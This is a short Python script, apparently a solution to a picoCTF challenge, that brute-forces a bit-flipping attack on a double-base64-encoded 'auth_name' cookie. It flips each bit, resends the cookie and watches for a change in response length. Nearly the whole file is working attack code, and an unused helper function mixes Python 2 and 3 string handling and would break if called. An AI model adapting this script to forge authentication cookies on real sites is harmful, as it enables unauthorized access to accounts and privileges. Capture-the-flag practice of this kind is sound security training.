import base64
import requests
from tqdm import tqdm

URL = "http://mercury.picoctf.net:21553/"

def bitFlip(pos, bit, data):
  raw = base64.b64decode(data)

  bits = list(raw)
  bits[pos] = chr(bits[pos]^bit)

  raw = ''.join(bits)
  return base64.b64encode(raw)

def get_ck(url):
  s = requests.Session()
  s.get(url)
  return s.cookies['auth_name']

def exploit(ck):
  decoded_cookie = base64.b64decode(ck)
  raw_cookie = base64.b64decode(decoded_cookie)

  # Loop over all the bytes in the cookie.
  # Adds a nice progress bar
  for position_idx in tqdm(range(0, len(raw_cookie))):
    # Loop over all the bits in the current byte at `postition_idx`
    for bit_idx in range(0,8):
      # Construct guess
      # - All the bytes before the current `position_idx` are left alone.
      # - The byte in the `position_idx` has the bit at position `bit_idx` flipped.
      #   This is done by XORing the byte with another byte where all bits are zero
      #   except for the bit in position `bit_idx`. The code `1 << bit_idx`
      #   creates a byte by shifting the bit `1` to the left `bit_idx` times. Thus,
      #   the XOR operation will flip the bit in position `bit_idx`.
      # - All bytes after the current `position_idx` are left alone.
      bitflip_guess = (
        raw_cookie[0:position_idx]
        + ((raw_cookie[position_idx] ^ (1 << bit_idx)).to_bytes(1, "big"))
        + raw_cookie[position_idx + 1:]
      )

      # Double base64 encode the bit-flipped cookie following the encoding scheme
      guesse = base64.b64encode(base64.b64encode(bitflip_guess)).decode()

      # Send guesse
      r = requests.get(URL, cookies={"auth_name" : guesse})
      if len(r.text) != 1824:
        print(f"Potentially found something with {guesse}")
        return

if __name__ == "__main__":
  ck = get_ck(URL)

  exploit(ck)